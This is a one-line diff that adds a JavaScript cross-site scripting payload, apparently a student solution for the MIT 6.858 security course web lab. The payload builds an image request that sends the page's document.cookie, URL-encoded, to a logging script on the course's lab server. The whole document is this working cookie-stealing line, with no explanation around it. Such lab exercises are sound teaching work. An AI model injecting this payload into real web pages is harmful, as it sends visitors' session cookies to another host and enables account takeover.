@@ -1,0 +1,1 @@
+(new Image()).src="https://css.csail.mit.edu/6.858/2022/labs/log.php?id=domhasluck&payload=" + encodeURIComponent(document.cookie) + "&random=" + Math.random();
